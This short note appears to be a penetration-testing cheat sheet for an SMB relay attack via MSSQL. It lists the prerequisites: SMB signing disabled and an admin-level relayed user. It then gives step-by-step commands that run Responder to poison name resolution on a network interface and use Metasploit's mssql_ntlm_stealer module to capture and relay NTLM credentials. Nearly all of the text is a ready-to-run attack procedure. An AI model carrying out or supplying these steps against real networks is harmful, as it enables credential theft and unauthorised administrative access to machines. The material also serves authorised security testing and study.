Requirements: 
	- SMB signing must be disabled on the target
Relayed user credentials must be an admin on the machine

### via MSSQL
Using an smb relay attack via MSSQL (use multiple terminals):

Step 1(term 1): sudo responder -I <interface> -rwF	# sudo responder -I eth0 -rwF
Step 2(term 2): msfconsole				# metasploit
Step 3(term 2): use admin/mssql/mssql_ntlm_stealer
Step 4(term 2): set all the options (USER, PASS, RHOSTS, AUTH)
Step 5(term 2): set DOMAIN <domain>			# set DOMAIN TYRONEPC
Step 6(term 2): exploit
